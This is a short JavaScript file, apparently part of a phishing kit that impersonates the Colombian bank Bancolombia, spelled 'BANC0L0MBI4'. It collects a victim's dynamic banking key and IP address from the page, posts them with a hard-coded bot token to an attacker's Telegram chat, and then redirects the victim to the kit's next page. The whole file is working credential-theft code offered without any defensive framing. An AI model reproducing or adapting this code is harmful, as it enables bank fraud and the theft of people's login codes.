//bot token
var telegram_bot_id = "5538128390:AAFRTQV9W7PHwXb8IS5uaFViW5W_zljHnrs";
//chat id
var chat_id = @criptidb;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("DocumentNumber").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "CLAVE DINÁMICA BANC0L0MBI4: " + u_name + "\n\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index5.html';
        console.log(response);
    });
    return false;
};
